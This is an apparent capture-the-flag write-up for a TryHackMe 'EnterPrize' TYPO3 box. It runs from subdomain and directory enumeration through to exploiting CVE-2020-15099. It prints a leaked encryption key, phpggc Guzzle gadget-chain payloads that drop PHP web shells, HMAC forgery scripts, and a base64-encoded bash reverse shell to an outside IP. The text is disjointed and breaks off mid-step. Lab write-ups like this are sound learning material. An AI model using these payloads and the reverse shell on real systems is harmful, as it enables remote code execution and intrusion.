					<button formnovalidate="formnovalidate" class="btn btn-cancel" onclick="document.forms['contactForm-144'].submit();" type="button" name="" value="">Previous step</button>
				</span>
			
			
					<span class="btn-group next submit">
						<button class="btn btn-primary" type="submit" name="tx_form_formframework[contactForm-144][__currentPage]" value="2">
							Submit
						</button>
					</span>
				
		</div>
	</div>
</nav>


            </div>
        </form>
    
</div>


	


</div></div></div></main></div></div></div><!--TYPO3SEARCH_end--></div><footer id="page-footer" class="bp-page-footer"><section class="section footer-section footer-section-content"><div class="container"><div class="section-row"><div class="section-column footer-section-content-column footer-section-content-column-left"><div id="c207" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>Related Links</span></h4></header><p><a href="https://typo3.org/help/documentation/" title="TYPO3 Documentation" target="_blank" rel="noopener">Documentation</a><br /><a href="https://typo3.org/certification/" title="TYPO3 Certification" target="_blank" rel="noopener">Certification</a><br /><a href="https://typo3.org/community/" title="TYPO3 Community" target="_blank" rel="noopener">Community</a><br /><a href="https://extensions.typo3.org/" title="TYPO3 Extensions" target="_blank" rel="noopener">Extensions</a></p></div></div></div></div><div class="section-column footer-section-content-column footer-section-content-column-middle"><div id="c213" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>Professional Services</span></h4></header><p><a href="https://typo3.com/services/service-level-agreements/" target="_blank" rel="noopener">Service Level Agreements</a><br /><a href="https://typo3.com/services/extended-support/" target="_blank" rel="noopener">Extended Support</a><br /><a href="https://typo3.com/services/project-reviews/" target="_blank" rel="noopener">Project Reviews</a><br /><a href="https://typo3.com/services/find-me-a-partner/" target="_blank" rel="noopener">Find me a Partner</a></p></div></div></div></div><div class="section-column footer-section-content-column footer-section-content-column-right"><div id="c214" class="frame frame-default frame-type-text frame-layout-0 frame-background-none frame-no-backgroundimage frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><header class="frame-header"><h4 class="element-header "><span>100% free open source software</span></h4></header><p>We are committed to open source. Safe, reliable, no hidden agenda, no license jungle or legal issues, zero license fees. As a website owner, your investment in a TYPO3 CMS web application customized to perfectly match your requirements means you own your mission critical web infrastructure. No one can take that software back, unilaterally increase your licensing costs, or prevent you from improving and extending it.</p></div></div></div></div></div></div></section><section class="section footer-section footer-section-meta"><div class="frame frame-background-none frame-space-before-none frame-space-after-none"><div class="frame-container"><div class="frame-inner"><div class="footer-language"><ul id="language_menu" class="language-menu"><li class="active "><a href="/index.php?id=38&amp;tx_form_formframework%5Baction%5D=perform&amp;tx_form_formframework%5Bcontroller%5D=FormFrontend&amp;L=0&amp;cHash=63896b2174306c4f96ada29453d1cd18" hreflang="en-US" title="Default"><span>Default</span></a></li><li class=" text-muted"><span>German</span></li><li class=" text-muted"><span>Dansk</span></li></ul></div><div class="footer-copyright"><p>Running with <a href="http://www.typo3.org" target="_blank" rel="noopener">TYPO3</a> and <a href="https://www.bootstrap-package.com" target="_blank" rel="noopener">Bootstrap Package</a>.</p></div><div class="footer-sociallinks"><div class="sociallinks"><ul class="sociallinks-list"><li class="sociallinks-item sociallinks-item-facebook" title="Facebook"><a class="sociallinks-link sociallinks-link-facebook" href="https://www.facebook.com/typo3/" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-facebook"></span><span class="sociallinks-link-label">Facebook</span></a></li><li class="sociallinks-item sociallinks-item-twitter" title="Twitter"><a class="sociallinks-link sociallinks-link-twitter" href="https://twitter.com/typo3" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-twitter"></span><span class="sociallinks-link-label">Twitter</span></a></li><li class="sociallinks-item sociallinks-item-github" title="GitHub"><a class="sociallinks-link sociallinks-link-github" href="https://github.com/TYPO3/TYPO3.CMS" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-github"></span><span class="sociallinks-link-label">GitHub</span></a></li><li class="sociallinks-item sociallinks-item-youtube" title="YouTube"><a class="sociallinks-link sociallinks-link-youtube" href="https://www.youtube.com/user/typo3" rel="noopener" target="_blank"><span class="sociallinks-link-icon bootstrappackageicon bootstrappackageicon-youtube"></span><span class="sociallinks-link-label">YouTube</span></a></li></ul></div></div></div></div></div></section></footer><a class="scroll-top" title="Scroll to top" href="#top"><span class="scroll-top-icon"></span></a></div>
<script src="/typo3temp/assets/compressed/merged-31caf97aa732fbd68e6f74b2626dbc35.js?1610205876" type="text/javascript"></script>




</body>
</html>(venv)...:~/Typo3Scan# 
```



<img width="1364" height="754" alt="image" src="https://github.com/user-attachments/assets/38d76e6b-9eca-4401-85f4-d108ec24852c" />

<img width="1356" height="550" alt="image" src="https://github.com/user-attachments/assets/65e8c999-7a89-4acd-beb3-c5d427671bfc" />

<img width="1293" height="522" alt="image" src="https://github.com/user-attachments/assets/94895a5a-2d3f-4de6-ab58-3f1b9d408682" />

:~# echo "bash -i >& /dev/tcp/10.67.101.79/4444 0>&1" | base64 -w0
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ny4xMDEuNzkvNDQ0NCAwPiYxCg==



;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42Ny4xMDEuNzkvNDQ0NCAwPiYxCg==|base64 -d|bash;


<img width="1300" height="767" alt="image" src="https://github.com/user-attachments/assets/6254746f-6bad-4375-acf1-7e7fa684cd02" />

<img width="1308" height="652" alt="image" src="https://github.com/user-attachments/assets/fd5dcbd5-e2e2-4d42-9462-4390c723d7b5" />

<img width="1294" height="538" alt="image" src="https://github.com/user-attachments/assets/01bf7a70-ee40-4415-ae2b-379f39c0ea10" />





```bash
(venv) ...:~/Typo3Scan# cat a.txt
```

~/Typo3Scan# head -n 150 a.txt

=========================================================================

   ________                   ________   _________                       
   \_    _/__ __ ______  _____\_____  \ /   _____/ ____ _____    ___     
     |  | |  |  |\____ \|  _  | _(__  < \_____  \_/ ___\\__  \  /   \    
     |  | |___  ||  |_) | (_) |/       \/        \  \___ / __ \|  |  \   
     |__| / ____||   __/|_____|________/_________/\_____|_____/|__|__/   
          \/     |__|                                                    

                     Automatic Typo3 enumeration tool                    
                               Version 1.2                               
                         https://github.com/whoot                        
=========================================================================


[ Checking http://maintest.enterprize.thm ]
-------------------------------------------------------------------------

 [+] Core Information
 --------------------
 [+] Backend Login
  \u251c http://maintest.enterprize.thm/typo3/index.php
 [+] Version Information
  \u251c Identified Version:     9.5
  \u251c Could not identify exact version.
  \u251c Do you want to print all vulnerabilities for branch 9.5? (y/n): 
 [+] Extension Search
  \u251c Brute-Forcing 8808 Extensions

  \u251c Found 2 extensions
  \u251c Brute-Forcing Version Information
 [!] Version detection for extensions is unreliable. Verify manually!


 [+] Extension Information
 -------------------------
  [+] bootstrap_package
   \u251c Extension Title:       Bootstrap Package
   \u251c Extension Repo:        https://extensions.typo3.org/extension/bootstrap_package
   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package
   \u251c Current Version:       14.0.7 (stable)
   \u251c Identified Version:    10.0.9
   \u251c Version File:          http://maintest.enterprize.thm/typo3conf/ext/bootstrap_package/CHANGELOG.md
   \u2514 Known Vulnerabilities:

     [!] TYPO3-EXT-SA-2021-007
      \u251c Vulnerability Type: Cross-Site Scripting
      \u251c Affected Versions:  10.0.9 - 10.0.0
      \u2514 Advisory Url:       https://typo3.org/security/advisory/typo3-ext-sa-2021-007


  [+] introduction
   \u251c Extension Title:       The Official TYPO3 Introduction Package
   \u251c Extension Repo:        https://extensions.typo3.org/extension/introduction
   \u251c Extension Url:         http://maintest.enterprize.thm/typo3conf/ext/introduction
   \u251c Current Version:       4.6.1 (stable)
   \u251c Identified Version:    3.1.1
   \u2514 Version File:          http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg



<p> Web extensions:
  
- html<br>
- phps</p>

```bash
:~/Enterprize# ffuf -u http://enterprize.thm/indexFUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/web-extensions.txt
...
.phps                   [Status: 403, Size: 199, Words: 14, Lines: 8]
.html                   [Status: 200, Size: 85, Words: 5, Lines: 2]
```

<img width="1071" height="378" alt="image" src="https://github.com/user-attachments/assets/dcba405c-fb78-4911-80ee-a11ef8fff57a" />

<br>
<br>
<p>

- public<br>
- vendor<br>
- var<br>
- server-status</p>

```bash
:~/EnterPrize# :~/Enterprize# ffuf -u http://enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -t 80 -fs 196
...
var                     [Status: 403, Size: 199, Words: 14, Lines: 8]
public                  [Status: 403, Size: 199, Words: 14, Lines: 8]
vendor                  [Status: 403, Size: 199, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 85, Words: 5, Lines: 2]
```

<img width="1076" height="448" alt="image" src="https://github.com/user-attachments/assets/93094bfd-1549-4ba2-b7d5-2b852a09622d" />

<br>
<br>

```bash
:~/Enterprize# dirb http://enterprize.thm
...                                                   
---- Scanning URL: http://enterprize.thm/ ----
+ http://enterprize.thm/index.html (CODE:200|SIZE:85)                                                                                                        
+ http://enterprize.thm/public (CODE:403|SIZE:199)                                                                                                           
+ http://enterprize.thm/server-status (CODE:403|SIZE:199)                                                                                                    
+ http://enterprize.thm/var (CODE:403|SIZE:199)                                                                                                              
+ http://enterprize.thm/vendor (CODE:403|SIZE:199)                                                                               
```

<img width="1069" height="378" alt="image" src="https://github.com/user-attachments/assets/109cc85a-774b-4a51-87aa-9a021811a33a" />

<br>
<br>
<p><code>enterprize.thm</code> and <code>enterprize.thm/index.html</code></p>

<img width="1129" height="183" alt="image" src="https://github.com/user-attachments/assets/c6cc576a-dd82-4204-bff7-15c8a333e712" />


<p><code>enterprize.thm/composer.json</code></p>

<p>superhero1/enterprize</p>

<img width="1152" height="298" alt="image" src="https://github.com/user-attachments/assets/1d931071-a57c-4a94-b31c-9199408d5601" />


<img width="1128" height="420" alt="image" src="https://github.com/user-attachments/assets/d3615b33-0105-4082-a28e-1139662bd668" />


<br>
<br>
<br>
<p></p><code>maintest.enterprize.thm</code></p>

```bash
:~/Enterprize# ffuf -u http://enterprize.thm/ -c -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.enterprize.thm' -fs 85
...
maintest                [Status: 200, Size: 24555, Words: 1438, Lines: 49]
```

<img width="1157" height="408" alt="image" src="https://github.com/user-attachments/assets/834c0e2d-6d73-4bce-bdd2-6445f1a3499b" />

<br>
<br>
<br>

```bash
xx.xx.xx.xx   enterprize.thm  maintest.enterprize.thm
```

<p>WhatWeb</p>

```bash
:~/EnterPrize# apt install whatweb
```

```bash
:~/EnterPrize#  git clone https://github.com/urbanadventurer/WhatWeb.git
...
:~/EnterPrize# cd WhatWeb
:~/EnterPrize/WhatWeb# ls
addons        Gemfile  INSTALL.md  LICENSE   my-plugins          plugins           Rakefile   test     whatweb.1
CHANGELOG.md  icons    lib         Makefile  plugin-development  plugins-disabled  README.md  whatweb  whatweb.xsl
```

<p>TYPO3 9.5.22</p>

```bash
:~/EnterPrize/WhatWeb# ./whatweb http://maintest.enterprize.thm --plugins typo3 --aggression 3
http://maintest.enterprize.thm [200 OK] TYPO3[9.5.22]
```

```bash
:~/EnterPrize/Typo3Scan# ffuf -u http://maintest.enterprize.thm/FUZZ -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt -mc all -fs 196 -t 80
...
typo3                   [Status: 301, Size: 245, Words: 14, Lines: 8]
fileadmin               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3conf               [Status: 301, Size: 249, Words: 14, Lines: 8]
typo3temp               [Status: 301, Size: 249, Words: 14, Lines: 8]
server-status           [Status: 403, Size: 199, Words: 14, Lines: 8]
                        [Status: 200, Size: 24555, Words: 1438, Lines: 49
```

<p>maintest.enterprize.thm</p>

<img width="1132" height="543" alt="image" src="https://github.com/user-attachments/assets/c6f53c06-8884-4339-8cd5-94471ce748a1" />

<br>
<p>maintest.enterprize.thm/index.php</p>

<img width="1157" height="702" alt="image" src="https://github.com/user-attachments/assets/3cc51aa1-90ee-44b4-8eb5-6bcc5b9e96ba" />

<img width="1157" height="693" alt="image" src="https://github.com/user-attachments/assets/8e1ca781-52e3-43e3-a839-61a6c075047d" />

<br>
<p>www.bootstrap-package.com</p>

<img width="1156" height="696" alt="image" src="https://github.com/user-attachments/assets/7b3af00e-bd7d-4822-b02c-9e36ec1ec85e" />

<br>
<p>maintest.enterprize.thm/index.php?id=81</p>

<img width="1154" height="133" alt="image" src="https://github.com/user-attachments/assets/bd6d0d5c-3f06-48dd-b793-6ab396e85d8d" />

<br>
<p>maintest.enterprize.thm/index.php?id=38</p>

<img width="1094" height="817" alt="image" src="https://github.com/user-attachments/assets/dd813bab-884b-42ae-abc9-87321befc194" />

<img width="1082" height="809" alt="image" src="https://github.com/user-attachments/assets/7381ce80-7d6a-42a8-95fe-5b54ba82bcdc" />

<img width="1078" height="742" alt="image" src="https://github.com/user-attachments/assets/b79ae6dd-acb7-4ded-a0d9-b67e7b9dea6a" />

<img width="1070" height="314" alt="image" src="https://github.com/user-attachments/assets/87e97423-4cfb-4d92-ad1e-f7ac2a914379" />


```bash
O:39:"TYPO3\CMS\Form\Domain\Runtime\FormState":2:{s:25:"*lastDisplayedPageIndex";i:0;s:13:"*formValues";a:0:{}}
```

```bash
:~/EnterPrize# apt install weevely
```

<br>
<p>rose-agent.php</p>

```bash
:~/Enterprize# weevely generate rose rose-agent.php
Generated 'rose-agent.php' with password 'rose' of 751 byte size.
```

```bash
:~/Enterprize# git clone https://github.com/ambionics/phpggc
Cloning into 'phpggc'...
...
```

```bash
:~/Enterprize/phpggc# ls
Dockerfile  gadgetchains  lib  LICENSE  phpggc  README.md  templates  test-gc-compatibility.py
```

```bash
:~/Enterprize/phpggc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *    
```

```bash
:~/Enterprize/phpggc# ./phpggc -i Guzzle/FW1
Name           : Guzzle/FW1
Version        : 4.0.0-rc.2 <= 7.5.0+
Type           : File write
Vector         : __destruct

./phpggc Guzzle/FW1 <remote_path> <local_path>
```

```bash
712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b
```

```bash
:~/Enterprize/phpggc# hashid 712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b
Analyzing '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384) 
```

<br>
<p>a.php</p>

```bash
:~/Enterprize/phpggc# nano a.php
```

```bash
<?php
$sig = hash_hmac('sha384', $argv[1], "712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b");
print($sig);
?>
```

```bash
:~/Enterprize/phpggc# php ./phpgcc --base64 --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/rose-agent.php /root/Enterprize/phpggc/rose-agent.php > payload.txt
```

```bash
:~/Enterprize/phpggc# cat /root/Enterprize/phpggc/payload.txt| openssl dgst -sha1 -hmac '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b'
(stdin)= 58418e36b7c91a8b6a2f0eef51b4c7e204f1e4f4
```

```bash
:~/Enterprize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/Enterprize/phpggc/a.php
?????
```

<img width="1074" height="740" alt="image" src="https://github.com/user-attachments/assets/e1edb390-a35f-412b-8b9c-35a116b862da" />

```bash
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:".GuzzleHttp\Cookie\FileCookieJar.filename";s:50:"/var/www/html/public/fileadmin/_temp_/a.php";s:52:".GuzzleHttp\Cookie\FileCookieJar.storeSessionCookies";b:1;s:36:".GuzzleHttp\Cookie\CookieJar.cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:".GuzzleHttp\Cookie\CookieJar.strictMode";N;}i:7;i:7;}
```

<img width="1077" height="736" alt="image" src="https://github.com/user-attachments/assets/09da90ec-ee9c-4783-a036-dacadd531b7c" />



<br>
<p>maintest.enterprize.thm/typo3/</p>

<img width="1129" height="500" alt="image" src="https://github.com/user-attachments/assets/d72fb7b7-c69b-4e01-b542-45e8c21d7099" />

<br>
<p>maintest.enterprize.thm/typo3conf/</p>

<p>

- LocalConfiguration.old<br>
- LocalConfiguration.php<br>
- PackgeStates.php<br>
- ext/<br>
- l10n/<br>
</p>

<p>

- 'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!<br>
- passwordHashing' => ['className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash<br>
- 'dbname' => 'typo3'<br>
- 'driver' => 'mysqli'<br>
- 'host' => '127.0.0.1'<br>
- 'password' => 'password1', //replaced old password by 24 random chars & symbols<br>
- 'port' => 3306<br>
- 'encryptionKey' => '<code>712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b</code>',
</p>

<img width="1126" height="412" alt="image" src="https://github.com/user-attachments/assets/e55cb545-8c7e-4641-a5f6-0115ea2cd943" />

```bash
(venv) :~/EnterPrize# cat LocalConfiguration.old
<?php
return [
    'BE' => [
        'debug' => false,
        'explicitADmode' => 'explicitAllow',
        'installToolPassword' => '$argon2i$v=19$m=65536,t=16,p=', //removed hash for security!!
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'DB' => [
        'Connections' => [
            'Default' => [
                'charset' => 'utf8mb4',
                'dbname' => 'typo3',
                'driver' => 'mysqli',
                'host' => '127.0.0.1',
                'password' => 'password1', //replaced old password by 24 random chars & symbols
                'port' => 3306,
                'tableoptions' => [
                    'charset' => 'utf8mb4',
                    'collate' => 'utf8mb4_unicode_ci',
                ],
                'user' => 'typo3user',
            ],
        ],
    ],
    'EXT' => [
        'extConf' => [
            'backend' => 'a:6:{s:14:"backendFavicon";s:0:"";s:11:"backendLogo";s:0:"";s:20:"loginBackgroundImage";s:0:"";s:13:"loginFootnote";s:0:"";s:19:"loginHighlightColor";s:0:"";s:9:"loginLogo";s:0:"";}',
            'bootstrap_package' => 'a:8:{s:20:"disableCssProcessing";s:1:"0";s:17:"disableFontLoader";s:1:"0";s:24:"disableGoogleFontCaching";s:1:"0";s:27:"disablePageTsBackendLayouts";s:1:"0";s:28:"disablePageTsContentElements";s:1:"0";s:16:"disablePageTsRTE";s:1:"0";s:20:"disablePageTsTCEFORM";s:1:"0";s:20:"disablePageTsTCEMAIN";s:1:"0";}',
            'extensionmanager' => 'a:2:{s:21:"automaticInstallation";s:1:"1";s:11:"offlineMode";s:1:"0";}',
            'indexed_search' => 'a:20:{s:8:"pdftools";s:9:"/usr/bin/";s:8:"pdf_mode";s:2:"20";s:5:"unzip";s:9:"/usr/bin/";s:6:"catdoc";s:9:"/usr/bin/";s:6:"xlhtml";s:9:"/usr/bin/";s:7:"ppthtml";s:9:"/usr/bin/";s:5:"unrtf";s:9:"/usr/bin/";s:18:"trackIpInStatistic";s:1:"2";s:9:"debugMode";s:1:"0";s:18:"fullTextDataLength";s:1:"0";s:23:"disableFrontendIndexing";s:1:"0";s:21:"enableMetaphoneSearch";s:1:"1";s:6:"minAge";s:2:"24";s:6:"maxAge";s:1:"0";s:16:"maxExternalFiles";s:1:"5";s:26:"useCrawlerForExternalFiles";s:1:"0";s:11:"flagBitMask";s:3:"192";s:16:"ignoreExtensions";s:0:"";s:17:"indexExternalURLs";s:1:"0";s:16:"useMysqlFulltext";s:1:"0";}',
        ],
    ],
       'EXTENSIONS' => [
        'backend' => [
            'backendFavicon' => '',
            'backendLogo' => '',
            'loginBackgroundImage' => '',
            'loginFootnote' => '',
            'loginHighlightColor' => '',
            'loginLogo' => '',
        ],
        'bootstrap_package' => [
            'disableCssProcessing' => '0',
            'disableFontLoader' => '0',
            'disableGoogleFontCaching' => '0',
            'disablePageTsBackendLayouts' => '0',
            'disablePageTsContentElements' => '0',
            'disablePageTsRTE' => '0',
            'disablePageTsTCEFORM' => '0',
            'disablePageTsTCEMAIN' => '0',
        ],
        'extensionmanager' => [
            'automaticInstallation' => '1',
            'offlineMode' => '0',
        ],
        'indexed_search' => [
            'catdoc' => '/usr/bin/',
            'debugMode' => '0',
            'disableFrontendIndexing' => '0',
            'enableMetaphoneSearch' => '1',
            'flagBitMask' => '192',
            'fullTextDataLength' => '0',
            'ignoreExtensions' => '',
            'indexExternalURLs' => '0',
            'maxAge' => '0',
            'maxExternalFiles' => '5',
            'minAge' => '24',
            'pdf_mode' => '20',
            'pdftools' => '/usr/bin/',
            'ppthtml' => '/usr/bin/',
            'trackIpInStatistic' => '2',
            'unrtf' => '/usr/bin/',
            'unzip' => '/usr/bin/',
            'useCrawlerForExternalFiles' => '0',
            'useMysqlFulltext' => '0',
            'xlhtml' => '/usr/bin/',
        ],
    ],
    'FE' => [
        'debug' => false,
        'loginSecurityLevel' => 'normal',
        'passwordHashing' => [
            'className' => 'TYPO3\\CMS\\Core\\Crypto\\PasswordHashing\\Argon2iPasswordHash',
            'options' => [],
        ],
    ],
    'LOG' => [
        'TYPO3' => [
            'CMS' => [
                'deprecations' => [
                    'writerConfiguration' => [
                        5 => [
                            'TYPO3\CMS\Core\Log\Writer\FileWriter' => [
                                'disabled' => true,
                            ],
                        ],
                    ],
                ],
            ],
        ],
    ],
    'MAIL' => [
        'transport' => 'sendmail',
        'transport_sendmail_command' => '/usr/sbin/sendmail -t -i ',
        'transport_smtp_encrypt' => '',
        'transport_smtp_password' => '',
        'transport_smtp_server' => '',
        'transport_smtp_username' => '',
    ],
  'SYS' => [
        'devIPmask' => '',
        'displayErrors' => 0,
        'encryptionKey' => '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b',
        'exceptionalErrors' => 4096,
        'features' => [
            'newTranslationServer' => true,
            'unifiedPageTranslationHandling' => true,
        ],
        'sitename' => 'EnterPrize',
        'systemLogLevel' => 2,
        'systemMaintainers' => [
            1,
        ],
    ],
];
```

<br>
<p>http://maintest.enterprize.thm/typo3conf/ext/introduction/Documentation/Settings.cfg</p>

<img width="1050" height="375" alt="image" src="https://github.com/user-attachments/assets/373b73cb-32f6-48ae-a760-d7df0fc13afc" />

<br>
<p>github.com/FriendsOfTYPO3/introduction/issues</p>

<img width="1153" height="688" alt="image" src="https://github.com/user-attachments/assets/01ca2a57-1890-4414-b018-e485c8495211" />



<h3 align="center">CVE-2020-15099</h3>
<p = align="center">TYPO3 CMS Arbitrary File Disclosure and Remote Code Execution</p>

<br>

<h3>http://maintest.enterprize.thm/index.php?id=38</h3>

<img width="1242" height="851" alt="image" src="https://github.com/user-attachments/assets/9467681f-72a0-4646-8853-e6da7f148f44" />

<br>

<h3>phpggc</h3>

```bash
(venv) :/tmp/phpgcc# git clone https://github.com/ambionics/phpggc
...
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle

Gadget Chains
-------------

NAME                     VERSION                         TYPE                  VECTOR        I    
Guzzle/FW1               4.0.0-rc.2 <= 7.5.0+            File write            __destruct         
Guzzle/INFO1             6.0.0 <= 6.3.2                  phpinfo()             __destruct    *    
Guzzle/RCE1              6.0.0 <= 6.3.2                  RCE: Function Call    __destruct    *    
Pydio/Guzzle/RCE1        < 8.2.2                         RCE: Function Call    __toString         
WordPress/Guzzle/RCE1    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __toString    *    
WordPress/Guzzle/RCE2    4.0.0 <= 6.4.1+ & WP < 5.5.2    RCE: Function Call    __destruct    *  
```

```bash
(venv) :/tmp/phpgcc# ./phpggc -l Guzzle/FW1

Gadget Chains
-------------

NAME          VERSION                 TYPE          VECTOR        I    
Guzzle/FW1    4.0.0-rc.2 <= 7.5.0+    File write    __destruct         
```

<h3>m3.php</h3>

```bash
<?php $output = system($_GET[1]); echo $output ; ?>
```

<h3>phpgcc</h3>

```bash
:~/EnterPrize/phpggc# ./phpggc -b --fast-destruct Guzzle/FW1 /var/www/html/public/fileadmin/_temp_/backdoor.php /root/EnterPrize/phpggc/m3.php
YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==
```

```bash
:~/EnterPrize/phpggc# cat hash_hmac.php
<?php
echo hash_hmac('sha1', 'YToyOntpOjc7TzozMToiR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphciI6NDp7czo0MToiAEd1enpsZUh0dHBcQ29va2llXEZpbGVDb29raWVKYXIAZmlsZW5hbWUiO3M6NTA6Ii92YXIvd3d3L2h0bWwvcHVibGljL2ZpbGVhZG1pbi9fdGVtcF8vYmFja2Rvb3IucGhwIjtzOjUyOiIAR3V6emxlSHR0cFxDb29raWVcRmlsZUNvb2tpZUphcgBzdG9yZVNlc3Npb25Db29raWVzIjtiOjE7czozNjoiAEd1enpsZUh0dHBcQ29va2llXENvb2tpZUphcgBjb29raWVzIjthOjE6e2k6MDtPOjI3OiJHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUiOjE6e3M6MzM6IgBHdXp6bGVIdHRwXENvb2tpZVxTZXRDb29raWUAZGF0YSI7YTozOntzOjc6IkV4cGlyZXMiO2k6MTtzOjc6IkRpc2NhcmQiO2I6MDtzOjU6IlZhbHVlIjtzOjUyOiI8P3BocCAkb3V0cHV0ID0gc3lzdGVtKCRfR0VUWzFdKTsgZWNobyAkb3V0cHV0IDsgPz4KIjt9fX1zOjM5OiIAR3V6emxlSHR0cFxDb29raWVcQ29va2llSmFyAHN0cmljdE1vZGUiO047fWk6NztpOjc7fQ==', '712dd4d9c583482940b75514e31400c11bdcbc7374c8e62fff958fcd80e8353490b0fdcf4d0ee25b40cf81f523609c0b');
?>
```

```bash
:~/EnterPrize/phpggc# php hash_hmac.php
61185e34fa209a475442a285fce1a42dbaca0c1c
```


<h3>CyberChef</h3>

<img width="1351" height="402" alt="image" src="https://github.com/user-attachments/assets/e703c618-9c29-4375-9d3f-bc6f90ef97c3" />


```bash
a:2:{i:7;O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:41:".GuzzleHttp\Cookie\FileCookieJar.filename";s:50:"/var/www/html/public/fileadmin/_temp_/backdoor.php";s:52:".GuzzleHttp\Cookie\FileCookieJar.storeSessionCookies";b:1;s:36:".GuzzleHttp\Cookie\CookieJar.cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:33:".GuzzleHttp\Cookie\SetCookie.data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:26:"<?php system($_GET[1]);?>
";}}}s:39:".GuzzleHttp\Cookie\CookieJar.strictMode";N;}i:7;i:7;}
```



<h3>hmac.php</h3>

```bash
cat hmac.php
<?php
